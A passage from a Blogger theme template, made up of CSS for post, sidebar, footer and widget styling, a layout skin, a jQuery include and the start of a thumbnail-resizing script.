    text-transform: uppercase;
    overflow: hidden;
}
#related-posts ul.related {
padding: 0 10px;
}
.related li {
    display: inline-block;
    overflow: hidden;
    float: left;
    width: 33.33%;
    position: relative;
    padding-right: 8px;
    box-sizing: border-box;
}
.related li:nth-child(3n) {
padding-right:0;
}
.related li h3 {
margin-bottom:5px;
}
.related-thumb {
width: 100%;
height: 140px;
overflow: hidden;
position: relative;
vertical-align: middle;
    margin: 0 0 10px;
}
.related li .related-img {
width: 100%;
height: 140px;
display: block;
transition: all .3s ease-out!important;
-webkit-transition: all .3s ease-out!important;
-moz-transition: all .3s ease-out!important;
-o-transition: all .3s ease-out!important;
}
.related li .related-img:hover {
-webkit-transform: scale(1.1) rotate(-1.5deg)!important;
-moz-transform: scale(1.1) rotate(-1.5deg)!important;
transform: scale(1.1) rotate(-1.5deg)!important;
transition: all .3s ease-out!important;
-webkit-transition: all .3s ease-out!important;
-moz-transition: all .3s ease-out!important;
-o-transition: all .3s ease-out!important;
}
.related-title a {
    font-size: 15px;
    line-height: 1.4em;
    padding: 0;
    font-family: 'Montserrat', sans-serif;
    font-weight: 500;
    font-style: normal;
    letter-spacing: 0.5px;
    color: #151515;
    display: block;
}
.recent-summary {
    color: #666;
    font-size: 11px;
    letter-spacing: 0.3px;
line-height: 1.6;
}

.related .related-tag {
display:none;
}

.related-overlay {
position: absolute;
left: 0;
top: 0;
z-index: 1;
width: 100%;
height: 100%;
background-color: rgba(40,35,40,0.05);
}
.related-content {
display: block;
bottom: 0;
padding: 0px 0px 11px;
width: 100%;
line-height: 1.2em;
box-sizing: border-box;
z-index: 2;
}
.related .related-content .recent-date {
display:none;
}
.recent-date:before, .p-date:before {
content: '\f017';
font-family: fontawesome;
margin-right: 5px;
}
/*****************************************
Footer Bottom CSS
******************************************/
#lower {
margin:auto;
padding: 0px 0px 10px 0px;
width: 100%;
box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
background:#fff;
}
#lower-wrapper {
margin:auto;
padding: 0;
}

#lowerbar-wrapper {
float: left;
margin: 0px 5px auto;
padding-bottom: 20px;
width: 32%;
text-align: justify;
color:#808080;
line-height: 1.6em;
word-wrap: break-word;
overflow: hidden;
max-width: 375px;
}
.lowerbar {margin: 0; padding: 0;}
.lowerbar .widget {margin: 0; padding: 10px 20px 0px 20px;box-sizing:border-box;}
.lowerbar h2 {
    color: #4c4c4c;
    font-size: 16px;
    padding: 16px 17.6px;
    margin: 0 0 20px;
    font-weight: 700;
  font-family: Montserrat;
    letter-spacing: 1.5px;
    text-transform: uppercase;
    position: relative;
    text-align: center;
}
.lowerbar ul {
margin: 0 auto;
padding: 0;
list-style-type: none;
}
.lowerbar li {
display:block;
line-height: 1.6em;
margin-left: 0 !important;
list-style-type: none;
}
.lowerbar li a {
text-decoration:none; color: $maincolor;
}
.lowerbar li a:hover {
text-decoration:none;
}
.lowerbar .PopularPosts .widget-content ul li, .lowerbar .custom-widget li {

}
/* ######## Footer Css ######################### */
#jugas_footer {
    background: #fff;
    color: #808080;
font-family: 'Montserrat', sans-serif;
    font-weight: 400;
    padding: 10px 0px;
    border-top: 1px solid #e5e5e5;
}
.copy-container {
    margin: 0 auto;
    overflow: hidden;
}
.jugas_footer_copyright a {
    color: $maincolor;
}
.jugas_footer_copyright {
    text-align: left;
    display: inline-block;
    line-height: 30px;
}
/* ######## Custom Widget Css ######################### */
#clients-list .interact {
    display: none;
}
#clients-list li i {
color: #00a68e;
    background-color: white;
    box-shadow: 2px 2px 0px rgba(0,0,0,0.05);
    border: 1px solid #e5e5e5;
float: left;
    font-size: 18px;
    padding: 6px;
    border-radius: 24px;
    margin-top: 5px;
}
#clients-list li p {
    margin-left: 40px;
}
#clients-list li p.tweet a {
color:$maincolor;
}
#clients-list li p a {
color:#a6a6a6;
}
select#BlogArchive1_ArchiveMenu {
width: 100%;
padding: 10px;
border-color: #777;
}
.BlogArchive ul li {
    margin-bottom: 7px !important;
    padding-bottom: 7px;
}
.BlogArchive ul li:last-child {
    margin-bottom: 0;
    padding-bottom: 0;
    border-bottom: none;
}
.BlogArchive ul li a {
   color:$textcolor;
}
.BlogArchive ul li a:hover {
  color:$maincolor;
}
.BlogArchive .zippy {
color:$maincolor;
}
.BlogArchive .post-count-link {
font-weight:600;
}
.BlogArchive ul .posts a {
font-family:Playfair Display;
}
.contact-form-name, .contact-form-email, .contact-form-email-message, .contact-form-widget {
max-width: none;
}
.contact-form-name, .contact-form-email, .contact-form-email-message {
background-color: #EBEBEB;
border: 1px solid #ccc;
}
.contact-form-widget .form {
}
.contact-form-button-submit {
max-width: none;
width: 100%;
height: 35px;
border:0;
background-image: none;
background-color: $maincolor !important;
cursor: pointer;
font-style: normal;
font-weight: 400;
}
.contact-form-name:focus, .contact-form-email:focus, .contact-form-email-message:focus {
border-color: #f8695f;
box-shadow: none;
}
.contact-form-name:hover, .contact-form-email:hover, .contact-form-email-message:hover {
border-color:#f8695f;
}
.contact-form-button-submit:hover {
background-color: #303030;
background-image: none;
border: 0;
}
.contact-form-widget {
    padding: 20px;
    box-sizing: border-box;
}
.ty-bonus .ty-wow {
    overflow: hidden;
    border-bottom: 1px solid #F5F5F5;
    padding: 10px 0;
}
.ty-bonus .ty-wow:first-child {
    padding-top: 0;
}
.ty-bonus .ty-wow:last-child {
    border-bottom: none;
}
.ty-bonus .ty-thumb-bonos {
    position: relative;
    float: left;
    margin: 0!important;
    width: 80px;
    height: 60px;
    overflow: hidden;
    display: block;
    vertical-align: middle;
}
.ty-bonus .ty-bonus-con {
    padding-left: 10px;
    display: table-cell;
}
.ty-bonus .ty-bonos-entry {
    overflow: hidden;
    line-height: 0;
    margin: 0 0 2px;
    padding: 0;
}
.ty-bonus .ty-bonos-entry a {
    color: $maindarkcolor;
    font-weight: 400;
    font-size: 14px;
    line-height: 1.5em;
}
.ty-bonus .ty-bonos-entry a:hover {
    color: $maincolor;
}
.ty-bonus .ty-thumb-bonos:hover .tyimg-lay {
    background-color: rgba(40, 35, 40, 0.3);
}
.yard-auth-ty {
    margin-right: 10px;
}
.yard-auth-ty::before {
    content: '\f007';
    font-family: fontawesome;
    color: #bbb;
    margin-right: 5px;
}
.yard-auth-ty,
.ty-time {
    color: #bdbdbd;
    font-size: 12px;
    font-weight: 400;
}
.ty-time:before {
    content: '\f133';
    font-family: fontawesome;
    color: #bbb;
    margin-right: 5px;
}
.sidebar .PopularPosts .widget-content ul li:first-child,
.sidebar .ty-bonus .ty-wow:first-child {
    padding-top: 0;
    border-top: 0;
}
.sidebar .PopularPosts .widget-content ul li:last-child,
.sidebar .ty-bonus .ty-wow:last-child {
    padding-bottom: 0;
}
.tyard-komet .ty-komet .ty-komet-tar {
    position: relative;
    overflow: hidden;
    padding: 0;
    width: 55px;
    height: 55px;
    float: left;
    margin: 0 10px 0 0;
}
.tyard-komet .ty-komet {
    background: none!important;
    clear: both;
    list-style: none;
    word-break: break-all;
    display: block;
    border-top: 1px solid #F5F5F5;
    border-bottom: 0 !important;
    overflow: hidden;
    margin: 0;
    padding: 10px 0;
}
.tyard-komet .ty-komet:first-child {
    padding-top: 0;
    border-top: 0;
}
.tyard-komet .ty-komet:last-child {
    padding-bottom: 0;
}
.tyard-komet .ty-komet span {
  color: #bdbdbd;
    display: block;
    line-height: 1.2em;
    text-transform: lowercase;
    font-size: 12px;
    font-style: italic;
    font-weight: 400;
    overflow: hidden;
    background: #f9f9f9;
    height: 38px;
    margin-top: 5px;
    box-sizing: border-box;
    padding: 5px 8px;
}
.yardimg-komet {
    width: 55px;
    height: 55px;
    float: left;
    margin: 0 10px 0 0;
}
.tyard-komet a {
    color: $darkcolor;
    position: relative;
    font-size: 13px;
    text-transform: capitalize;
    display: block;
    overflow: hidden;
    font-weight: 400;
}
.tyard-komet a:hover {
    color:$maincolor;
}
.tyard-komet {
    list-style: none;
    padding: 0;
}
.sidebar .PopularPosts .widget-content ul li:first-child,
#sidetabs .PopularPosts .widget-content ul li:first-child {
padding-top: 0;
border-top: 0
}
.sidebar .PopularPosts .widget-content ul li:last-child,
.sidebar .ty-bonus .ty-wow:last-child,
.tab-widget .PopularPosts .widget-content ul li:last-child,
.tab-widget .ty-bonus .ty-wow:last-child {
padding-bottom: 0
}
.sidebar .FollowByEmail > h3.title,
.sidebar .FollowByEmail .title-wrap {
    margin-bottom: 0
}
.FollowByEmail td {
    width: 100%;
    float: left;
    box-sizing: border-box
}
.FollowByEmail .follow-by-email-inner .follow-by-email-submit {
    margin-left: 0;
    width: 100%;
    border-radius: 0;
    height: 30px;
    font-size: 11px;
    color: #fff;
    background-color: $maincolor;
    font-family: inherit;
    text-transform: uppercase;
    font-weight: 700;
    letter-spacing: 1px
}
.FollowByEmail .follow-by-email-inner .follow-by-email-submit:hover {
    opacity:0.8;
}
.FollowByEmail .follow-by-email-inner .follow-by-email-address {
    padding-left: 10px;
    height: 30px;
    border: 1px solid #FFF;
    margin-bottom: 5px;
    box-sizing: border-box;
    font-size: 11px;
    font-family: inherit
}
.FollowByEmail .follow-by-email-inner .follow-by-email-address:focus {
    border: 1px solid #FFF
}
.FollowByEmail .widget-content {
    background-color: $maindarkcolor;
    box-sizing: border-box;
    padding: 10px
}
.FollowByEmail .widget-content:before {
    content: "Enter your email address to subscribe to this blog and receive notifications of new posts by email.";
    font-size: 11px;
    color: #f2f2f2;
    line-height: 1.4em;
    margin-bottom: 5px;
    display: block;
    padding: 0 2px
}
.list-label-widget-content li {
    display: block;
    padding: 8px 0;
    border-bottom: 1px solid #f2f2f2;
    position: relative
}
.list-label-widget-content li:first-child {
    padding: 0 0 8px
}
.list-label-widget-content li:last-child {
    padding-bottom: 0;
    border-bottom: 0
}
.list-label-widget-content li a:before {
    content: '\f02c';
    font-size: 13px;
    color: $maindarkcolor;
font-family: fontawesome;
margin-right: 5px;
}

.list-label-widget-content li a {
    color: $maindarkcolor;
    font-size: 11px;
    font-weight: 700;
    text-transform: uppercase;
    transition: color .3s
}
.list-label-widget-content li a:hover {
    color: $maincolor
}
.list-label-widget-content li span:last-child {
    color: $maindarkcolor;
    font-size: 11px;
    font-weight: 700;
    position: absolute;
    top: 8px;
    right: 0
}
.list-label-widget-content li:first-child span:last-child {
    top: 2px
}
.cloud-label-widget-content {
    text-align: left
}
.cloud-label-widget-content .label-count {
    background: $maincolor;
    color: #fff!important;
    margin-left: -3px;
    white-space: nowrap;
    border-radius: 0;
    padding: 1px 4px!important;
    font-size: 12px!important;
    margin-right: 5px;
    transition: background .3s
}
.cloud-label-widget-content .label-size {
   box-shadow: 2px 2px 0px rgba(0,0,0,0.05);
    border: 1px solid #cccccc;
    display: block;
    float: left;
    font-size: 11px;
    margin: 0 5px 5px 0;
    transition: background .3s
}
.cloud-label-widget-content .label-size a,
.cloud-label-widget-content .label-size span {
    height: 18px!important;
    color: #808080;
    display: inline-block;
    font-size: 11px;
    font-weight: 700!important;
    text-transform: uppercase;
    padding: 6px 8px;
    transition: color .3s
}
.cloud-label-widget-content .label-size a {
    padding: 6px 10px
}
.cloud-label-widget-content .label-size a:hover {
    color: #fff!important
}
.cloud-label-widget-content .label-size,
.cloud-label-widget-content .label-count {
    height: 30px!important;
    line-height: 19px!important
}
.cloud-label-widget-content .label-size:hover {
    background: $maincolor;
    color: #fff!important
}
.cloud-label-widget-content .label-size:hover a {
    color: #fff!important
}
.cloud-label-widget-content .label-size:hover span {
    background: $maindarkcolor;
    color: #fff!important;
    cursor: pointer
}
.cloud-label-widget-content .label-size-1,
.label-size-2,
.label-size-3,
.label-size-4,
.label-size-5 {
    font-size: 100%;
    opacity: 10
}
.label-size-1,
.label-size-2 {
    opacity: 100
}
#ads-blog .widget {
width: 728px;
max-height: 90px;
padding:0;
margin: 0px auto 15px !important;
max-width: 100%;
box-sizing: border-box;
}
#ads-blog-bottom .widget {
width: 728px;
max-height: 90px;
padding:0;
margin: 0px auto 15px !important;
max-width: 100%;
box-sizing: border-box;
}
#ads-blog-content {
margin:0 auto;
}
#ads-blog-content  .widget {
    margin: 15px auto 0 !important;
    display: block !important;
    width: 100%;
    max-height: 100%;
padding: 10px;
    max-width: 100%;
    box-sizing: border-box;
border: 1px solid rgba(0,0,0,0.12);
    background: #fff;
}

.ads-blog-post-top, .ads-blog-post-bottom {
display:none;
visibility:hidden;
}
.PopularPosts .widget-content ul li:first-child {
border-top:0;
}
.PopularPosts .item-thumbnail{margin:0 15px 0 0 !important;width:80px;height:60px;float:left;overflow:hidden;    position: relative}
.PopularPosts .item-thumbnail a{position:relative;display:block;overflow:hidden;line-height:0}
.PopularPosts ul li img{width:90px;height:65px;object-fit:cover;padding:0;transition:all .3s ease}
.PopularPosts .widget-content ul li{overflow:hidden;padding:10px 0;border-top:1px solid #f2f2f2}
.sidebar .PopularPosts .widget-content ul li:first-child,.sidebar .custom-widget li:first-child,.tab-widget .PopularPosts .widget-content ul li:first-child,.tab-widget .custom-widget li:first-child{padding-top:0;border-top:0}
.sidebar .PopularPosts .widget-content ul li:last-child,.sidebar .custom-widget li:last-child,.tab-widget .PopularPosts .widget-content ul li:last-child,.tab-widget .custom-widget li:last-child{padding-bottom:0}
.PopularPosts ul li a{color:#333333;font-weight:400;font-size:14px;line-height:1.4em;transition:color .3s;    font-family: 'Montserrat', sans-serif;}
.PopularPosts ul li a:hover{color:$maincolor}
.PopularPosts .item-title{margin:0 0 4px;padding:0;line-height:0}
.item-snippet{display:none;font-size:0;padding-top:0}
.PopularPosts ul {
counter-reset: popularcount;
margin: 0;
padding: 0;
}
.PopularPosts .item-thumbnail::before {
background: rgba(0, 0, 0, 0.3);
bottom: 0px;
content: "";
height: 100px;
width: 100px;
left: 0px;
right: 0px;
margin: 0px auto;
position: absolute;
z-index: 3;
}
/* Popular Posts */
.sidebar .PopularPosts .item-thumbnail{float:none;margin:0 0 10px;width:100%;height:auto;}
.sidebar .PopularPosts .item-title{background:rgba(0,0,0,0.5);position:absolute;display:block;clear:both;z-index:50;top:0;left:0;right:0;bottom:0;padding:15px;transition:all .4s;}
.sidebar .PopularPosts .item-title a {
color: rgba(255,255,255,1);
font-weight: 700;
font-size: 120%;
text-shadow: 0 0 5px rgba(0,0,0,.3);
}
.sidebar .PopularPosts .widget-content ul li img{translate(0,0) scale(1.0);transition:all .8s linear}
.sidebar .PopularPosts .widget-content ul li:hover img{transform:translate(0,-20px) scale(1.05);transition:all 3.6s linear;}
.sidebar .PopularPosts img{display:block;height:auto;width:100%;padding:0;backface-visibility:hidden;}
.sidebar .PopularPosts .item-snippet{display:none;}
.sidebar .PopularPosts ul li .item-content{position:relative;overflow:hidden;}
.sidebar .PopularPosts ul{padding:0;line-height:normal;counter-reset:count;}
.sidebar .PopularPosts .widget-content ul li {
position: relative;
padding: 0px 0;
overflow: hidden;
max-height: 120px;
transition: all .4s;
}
.sidebar .PopularPosts .widget-content ul li{
margin-bottom: 0;
padding-top: 0px;
}
/* ######## Responsive Css ######################### */
@media only screen and (max-width: 1150px) {
.row {
width: 96% !important;
margin: 0 auto;
float: none;
}
.headerleft {
float: none;
width: 100%;
text-align: center;
height: auto;
margin: 0 auto;
clear: both;
}
.headerleft img {
margin: auto;
padding-bottom: 15px;
}

.headerleft .description {
text-align:center;
}

}
@media only screen and (max-width: 1023px) {

#nav1, #nav {
display: none;
}
#nav {
display:none;
}
.selectnav {
width: auto;
color: #fff;
background: $maindarkcolor;
border: 1px solid rgba(255,255,255,0.1);
position: relative;
border: 0;
padding: 6px 10px!important;
margin: 5px 0;
}
.selectnav {
display: block;
width: 100%;
max-width:200px;
}
.tm-menu .selectnav {
display:inline-block;
    margin: 10px 0 0 10px;
}
#menu {
text-align:left;
}
}
@media only screen and (max-width: 980px) {
#main-wrapper, #sidebar-wrapper {
float: none;
clear: both;
width: 100%;
margin: 0 auto;
}

.post-body {
padding:8px;
}
#main-wrapper {
max-width: 100%;
}
#main-wrapper {
    padding: 0;
}
#sidebar-wrapper {
padding-top: 20px;
}
#lowerbar-wrapper {
        width: 100%;
    max-width: 375px;
    margin: 0 auto;
    float: none;
    clear: both;
}
.overlay a {
float: right;
margin: 30px 0;
}
.overlay h3 {
float: left;
}
}
@media screen and (max-width: 880px) {

.home #header-wrapper {
margin-bottom: 10px;
}
.item #content-wrapper {
padding: 10px 0 30px;
}
#label_with_thumbs li {
    width: 100%;
clear:both;
float:none;
margin-bottom:10px;
}

}
@media only screen and (max-width: 768px) {
.block-image .thumb img {
object-fit:cover;
}
#post-pager #blog-pager-newer-link {
    margin: 0 auto 10px;
}
#post-pager #blog-pager-older-link, #post-pager #blog-pager-newer-link {
    float: none;
    clear: both;
    margin: 0 auto;
    display: block;
width:100%;
}
.share-art span {
display: none;
}
.ops-404 {
width: 80%!important;
}
.title-404 {
font-size: 160px!important;
}
.overlay {
display:none;
visibility:hidden;
}
.post-labels {
margin-bottom: 10px;
}
}
@media screen and (max-width: 680px) {
}
@media only screen and (max-width: 480px) {
.tm-menu {
    height: auto;
    text-align: center;
    padding-bottom: 10px;
}
.tm-menu.makesticking {
padding:0;
}
.makesticking #searchform {
    display: none;
}
#menu {
    text-align: center;
}
.tm-menu .selectnav {
    display: inline-block;
    margin: 10px 0 0;
    max-width: 100%;
    box-sizing: border-box;
}
#searchform {
    float: none;
    width: 100%;
    clear: both;
    overflow: hidden;
    position: static;
}
#searchform fieldset {
    float: none;
}
#s {
        float: left;
    text-align: left;
    display: block;
    width: 100%;
border:0;
    padding-right: 30px;
    box-sizing: border-box;
}
#searchform .sbutton {
    position: absolute;
    right: 0;
}
.block-image {
float:none;
margin:0 auto;
clear:both;
width:100%;
}
.block-image .thumb img {
height:250px;
}
#meta-post i {
    margin-left: 5px;
    margin-right: 5px;
}
.item .post-footer .share-box .post-labels {
    float: none;
}
.post-footer .share-title {
    display: block;
    text-align: center;
    float: none;
}
.post-footer .share-art {
    float: none;
    margin-top: 10px;
}
#header-inner {
max-width:100%;
}
.item .post-header {
    border-width: 1px 1px 0;
}
.index .post h2, .archive .post h2 {
line-height: 1.4em;
font-size: 19px;
}
.related li {
    display: block;
    float: none;
    width: 100%;
    padding-right: 0;
}
.jugas_footer_copyright {
    text-align: center;
    display: block;
    clear: both;
}
.top-bar-social, .bottom-bar-social {
    float: none;
    width: 100%;
    clear: both;
    overflow: hidden;
}
.top-bar-menu {
    float: none;
    width: 100%;
    clear: both;
    margin-top: 0;
    margin-bottom: 10px;
text-align:center;
}
.top-bar-menu .selectnav {
    display: inline-block;
}
.top-bar-social li, .bottom-bar-social li {
    display: inline-block;
    float: none;
}
.top-bar-social #social a, .bottom-bar-social #social a {
    width: 20px;
    height: 20px;
    line-height: 20px;
    font-size: 9px;
}
.top-bar-menu .selectnav {
    width: 100%;
}
h1.post-title {
font-size: 22px;
margin-bottom: 10px;
line-height: 1.4em;
}
.breadcrumbs {
display:none;
}
#sidebar-wrapper {
max-width: 100%;
}
.about-widget-image {
overflow: hidden;
}
.share-art {
    float: none;
    margin: 0 auto;
    text-align: center;
    clear: both;
}
.share-title{
display:none;
}
.blog-pager-newer-link .pager-title, .blog-pager-newer-link .pager-heading, .blog-pager-older-link .pager-title, .blog-pager-older-link .pager-heading {
display: none;
}
.blog-pager-older-link .post-nav-icon, .blog-pager-newer-link .post-nav-icon {
line-height: 40px;
width: 100%;
}
.comments .comments-content .comment-replies {
margin-left:0px
}
}
@media only screen and (max-width: 360px) {
#header-inner img {
max-width: 100%;
margin: 0 auto;
float: none;
height: auto;
}
#meta-post {
position: relative;
overflow: hidden;
display: block;
border-bottom: 1px solid #f2f2f2;
}
#meta-post:after {
display: none;
}
.index .post h2, .archive .post h2 {
font-size: 16px;
}
.share-art {
float: none;
clear: both;
margin: 0 auto;
text-align: center;
}
}
@media only screen and (max-width: 300px) {
#sidebar-wrapper {display:none}
.top-bar-menu,.selectnav{width:100%}
.ty-ran-yard {
    display: none;
}
#menu {
    text-align: center;
    padding: 0;
}
.archive .post h2,.index .post h2 {
line-height: 1.4em !important;
font-size: 14px!important;
}
.index .snippets,.archive .snippets,.sora-author-box img,.share-box .post-author {
display: none;
}
.share-art, .share-box .post-author {
float: none;
margin: 0 auto;
text-align: center;
clear: both;
}
.read-more-wrap, .post-labels {
float: none !important;
clear: both;
display: block;
text-align: center;
}
.ops-404 {
font-size: 18px!important;
}
.title-404 {
font-size: 110px !important;
}
h1.post-title {
font-size: 17px;
}
.share-box {
overflow: hidden;
}
.top-bar-social #social a {
width: 24px;
height: 24px;
line-height: 24px;
}
}
]]></b:skin>
<style>
/*-------Typography and ShortCodes-------*/
.firstcharacter{float:left;color:#27ae60;font-size:75px;line-height:60px;padding-top:4px;padding-right:8px;padding-left:3px}.post-body h1,.post-body h2,.post-body h3,.post-body h4,.post-body h5,.post-body h6{margin-bottom:15px;color:#2c3e50}blockquote{font-style:italic;color:#888;border-left:5px solid #27ae60;margin-left:0;padding:10px 15px}blockquote:before{content:&#39;\f10d&#39;;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;margin-right:10px;color:#888}blockquote:after{content:&#39;\f10e&#39;;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;margin-left:10px;color:#888}.button{background-color:#2c3e50;float:left;padding:5px 12px;margin:5px;color:#fff;text-align:center;border:0;cursor:pointer;border-radius:3px;display:block;text-decoration:none;font-weight:400;transition:all .3s ease-out !important;-webkit-transition:all .3s ease-out !important}a.button{color:#fff!important}.button:hover{background-color:#27ae60;color:#fff}.button.small{font-size:12px;padding:5px 12px}.button.medium{font-size:16px;padding:6px 15px}.button.large{font-size:18px;padding:8px 18px}.small-button{width:100%;overflow:hidden;clear:both}.medium-button{width:100%;overflow:hidden;clear:both}.large-button{width:100%;overflow:hidden;clear:both}.demo:before{content:&quot;\f06e&quot;;margin-right:5px;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.download:before{content:&quot;\f019&quot;;margin-right:5px;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.buy:before{content:&quot;\f09d&quot;;margin-right:5px;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.visit:before{content:&quot;\f14c&quot;;margin-right:5px;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.widget .post-body ul,.widget .post-body ol{line-height:1.5;font-weight:400}.widget .post-body li{margin:5px 0;padding:0;line-height:1.5}.post-body ul li:before{content:&quot;\f105&quot;;margin-right:5px;font-family:fontawesome}pre{font-family:Monaco, &quot;Andale Mono&quot;, &quot;Courier New&quot;, Courier, monospace;background-color:#2c3e50;background-image:-webkit-linear-gradient(rgba(0, 0, 0, 0.05) 50%, transparent 50%, transparent);background-image:-moz-linear-gradient(rgba(0, 0, 0, 0.05) 50%, transparent 50%, transparent);background-image:-ms-linear-gradient(rgba(0, 0, 0, 0.05) 50%, transparent 50%, transparent);background-image:-o-linear-gradient(rgba(0, 0, 0, 0.05) 50%, transparent 50%, transparent);background-image:linear-gradient(rgba(0, 0, 0, 0.05) 50%, transparent 50%, transparent);-webkit-background-size:100% 50px;-moz-background-size:100% 50px;background-size:100% 50px;line-height:25px;color:#f1f1f1;position:relative;padding:0 7px;margin:15px 0 10px;overflow:hidden;word-wrap:normal;white-space:pre;position:relative}pre:before{content:&#39;Code&#39;;display:block;background:#F7F7F7;margin-left:-7px;margin-right:-7px;color:#2c3e50;padding-left:7px;font-weight:400;font-size:14px}pre code,pre .line-number{display:block}pre .line-number a{color:#27ae60;opacity:0.6}pre .line-number span{display:block;float:left;clear:both;width:20px;text-align:center;margin-left:-7px;margin-right:7px}pre .line-number span:nth-child(odd){background-color:rgba(0, 0, 0, 0.11)}pre .line-number span:nth-child(even){background-color:rgba(255, 255, 255, 0.05)}pre .cl{display:block;clear:both}#contact{background-color:#fff;margin:30px 0 !important}#contact .contact-form-widget{max-width:100% !important}#contact .contact-form-name,#contact .contact-form-email,#contact .contact-form-email-message{background-color:#FFF;border:1px solid #eee;border-radius:3px;padding:10px;margin-bottom:10px !important;max-width:100% !important}#contact .contact-form-name{width:47.7%;height:50px}#contact .contact-form-email{width:49.7%;height:50px}#contact .contact-form-email-message{height:150px}#contact .contact-form-button-submit{max-width:100%;width:100%;z-index:0;margin:4px 0 0;padding:10px !important;text-align:center;cursor:pointer;background:#27ae60;border:0;height:auto;-webkit-border-radius:2px;-moz-border-radius:2px;-ms-border-radius:2px;-o-border-radius:2px;border-radius:2px;text-transform:uppercase;-webkit-transition:all .2s ease-out;-moz-transition:all .2s ease-out;-o-transition:all .2s ease-out;-ms-transition:all .2s ease-out;transition:all .2s ease-out;color:#FFF}#contact .contact-form-button-submit:hover{background:#2c3e50}#contact .contact-form-email:focus,#contact .contact-form-name:focus,#contact .contact-form-email-message:focus{box-shadow:none !important}.alert-message{position:relative;display:block;background-color:#FAFAFA;padding:20px;margin:20px 0;-webkit-border-radius:2px;-moz-border-radius:2px;border-radius:2px;color:#2f3239;border:1px solid}.alert-message p{margin:0 !important;padding:0;line-height:22px;font-size:13px;color:#2f3239}.alert-message span{font-size:14px !important}.alert-message i{font-size:16px;line-height:20px}.alert-message.success{background-color:#f1f9f7;border-color:#e0f1e9;color:#1d9d74}.alert-message.success a,.alert-message.success span{color:#1d9d74}.alert-message.alert{background-color:#DAEFFF;border-color:#8ED2FF;color:#378FFF}.alert-message.alert a,.alert-message.alert span{color:#378FFF}.alert-message.warning{background-color:#fcf8e3;border-color:#faebcc;color:#8a6d3b}.alert-message.warning a,.alert-message.warning span{color:#8a6d3b}.alert-message.error{background-color:#FFD7D2;border-color:#FF9494;color:#F55D5D}.alert-message.error a,.alert-message.error span{color:#F55D5D}.fa-check-circle:before{content:&quot;\f058&quot;}.fa-info-circle:before{content:&quot;\f05a&quot;}.fa-exclamation-triangle:before{content:&quot;\f071&quot;}.fa-exclamation-circle:before{content:&quot;\f06a&quot;}.post-table table{border-collapse:collapse;width:100%}.post-table th{background-color:#eee;font-weight:bold}.post-table th,.post-table td{border:0.125em solid #333;line-height:1.5;padding:0.75em;text-align:left}@media (max-width: 30em){.post-table thead tr{position:absolute;top:-9999em;left:-9999em}.post-table tr{border:0.125em solid #333;border-bottom:0}.post-table tr + tr{margin-top:1.5em}.post-table tr,.post-table td{display:block}.post-table td{border:none;border-bottom:0.125em solid #333;padding-left:50%}.post-table td:before{content:attr(data-label);display:inline-block;font-weight:bold;line-height:1.5;margin-left:-100%;width:100%}}@media (max-width: 20em){.post-table td{padding-left:0.75em}.post-table td:before{display:block;margin-bottom:0.75em;margin-left:0}}
.FollowByEmail {
    clear: both;
}
</style>
<b:template-skin><![CDATA[
/*------Layout (No Edit)----------*/
body#layout .theme-opt {
display: block !important;
}
body#layout .option {
background-color: #2c3e50!important;
overflow: hidden!important;
}
body#layout .option h4 {
font-size: 16px;
padding: 4px 0 7px;
color: #fff!important;
}
body#layout .option .widget {
float: none;
width: 100%;
}
body#layout .option .widget.locked-widget .widget-content {
background-color: #34495e !important;
border-color: #455668 !important;
color: #fff!important;
}
body#layout .option .widget.locked-widget .widget-content a.editlink {
color: #fff !important;
border: 1px solid #233648;
border-radius: 2px;
padding: 2px 5px;
background-color: #233648;
}
body#layout #outer-wrapper, body#layout .row {
    padding: 0;
    width: 800px
}
body#layout .section h4 {
color: #333;
text-align:center;
text-transform:uppercase;
letter-spacing:1.5px;
}
body#layout .tm-menu {
height: auto;
}
body#layout #menu {
display: block;
visibility:visible;
height: auto;
}
body#layout #menu .widget {
display: block;
visibility:visible;
}
body#layout #ads-blog-content .widget .widget-content {
    display: block;
}
body#layout #content-wrapper {
    margin: 0 auto
}

body#layout #main-wrapper {
    float: left;
    width: 70%;
    margin: 0;
    padding: 0
}

body#layout #sidebar-wrapper {
    float: right;
    width: 30%;
    margin: 0;
    padding: 5px 0 0;
}
body#layout #sidebar-wrapper .section {
background-color: #f8e244 !important;
border: 1px solid #fff
}
body#layout #sidebar-wrapper .section h4 {
color:#000;
}
body#layout #sidebar-wrapper .section .widget-content {
border-color: #5a7ea2!important
}
body#layout #sidebar-wrapper .section .draggable-widget .widget-wrap2 {
background-color: #0080ce !important
}

body#layout #main-wrapper #main {
    margin-right: 4px;
    background-color: #5a7ea2;
    border-color: #34495e
}
body#layout #main-wrapper #main h4 {
    color: #fff!important
}
body#layout .layout-widget-description {
    display: none!important
}
body#layout #lowerbar-wrapper {
    width: 32%;
    float: left;
}
body#layout #Blog1 .widget-content {
    border-color: #34495e
}
body#layout .ads-blog-post-top, body#layout .ads-blog-post-bottom {
    display: block;
    visibility: visible;
}
body#layout .feat-slider-wrap .section {
background-color: #a0d3db !important;
border: 1px solid #a2dbeb
}
body#layout .FollowByEmail .widget-content:before {
    display: none;
}
body#layout .top-bar-social, body#layout .top-bar-menu {
width:47%;
}
body#layout .bottom-bar-social {
display:block;
}
/*------Layout (end)----------*/
]]></b:template-skin>

<b:include data='blog' name='google-analytics'/>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js' type='text/javascript'/>

<script type='text/javascript'>
snippet_count = 350;
          //<![CDATA[
function bp_thumbnail_resize(image_url, post_title) {
    image_tag = '<img src="' + image_url.replace('/s72-c/', '/h350-w750-c/') + '" alt="' + post_title.replace(/"/g, "") + '" title="' + post_title.replace(/"/g, "") + '"/>';
    if (post_title != "") return image_tag;
    else return ""
}
